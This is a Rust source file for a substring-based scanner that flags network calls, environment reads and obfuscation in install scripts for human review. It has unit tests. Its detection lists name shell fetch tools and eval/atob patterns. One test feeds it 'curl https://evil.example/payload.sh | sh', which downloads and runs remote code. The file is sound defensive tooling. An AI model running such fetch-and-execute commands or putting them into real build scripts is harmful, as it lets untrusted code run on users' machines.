#[derive(Debug, Clone, PartialEq, Eq, serde::Serialize)]
pub enum SuspiciousPattern {
    NetworkCall { matched: String },
    EnvRead { matched: String },
    Obfuscation { matched: String },
}

const NETWORK_MARKERS: &[&str] = &["curl ", "wget ", "fetch(", "http://", "https://", "XMLHttpRequest"];
const ENV_MARKERS: &[&str] = &["process.env", "std::env::var", "os.environ", "ENV["];
const OBFUSCATION_MARKERS: &[&str] = &["eval(", "Function(", "base64", "atob(", "String.fromCharCode"];

/// Heuristic static scan of an install/build script body — the signal list
/// from `02-security-core.md` §3: network calls, env reads, obfuscation.
/// Deliberately substring-based rather than a full parser: cheap, no false
/// negatives on the obvious cases this is meant to catch, and a scan this
/// coarse is a pre-review flag for a human, not an auto-block.
pub fn scan_install_script(script: &str) -> Vec<SuspiciousPattern> {
    let mut findings = Vec::new();
    for marker in NETWORK_MARKERS {
        if script.contains(marker) {
            findings.push(SuspiciousPattern::NetworkCall { matched: marker.to_string() });
        }
    }
    for marker in ENV_MARKERS {
        if script.contains(marker) {
            findings.push(SuspiciousPattern::EnvRead { matched: marker.to_string() });
        }
    }
    for marker in OBFUSCATION_MARKERS {
        if script.contains(marker) {
            findings.push(SuspiciousPattern::Obfuscation { matched: marker.to_string() });
        }
    }
    findings
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn clean_script_has_no_findings() {
        let findings = scan_install_script("node ./build.js");
        assert!(findings.is_empty());
    }

    #[test]
    fn flags_network_call() {
        let findings = scan_install_script("curl https://evil.example/payload.sh | sh");
        assert!(findings.iter().any(|f| matches!(f, SuspiciousPattern::NetworkCall { .. })));
    }

    #[test]
    fn flags_env_read_and_obfuscation_together() {
        let findings = scan_install_script("eval(atob(process.env.PAYLOAD))");
        assert!(findings.iter().any(|f| matches!(f, SuspiciousPattern::EnvRead { .. })));
        assert!(findings.iter().any(|f| matches!(f, SuspiciousPattern::Obfuscation { .. })));
    }
}
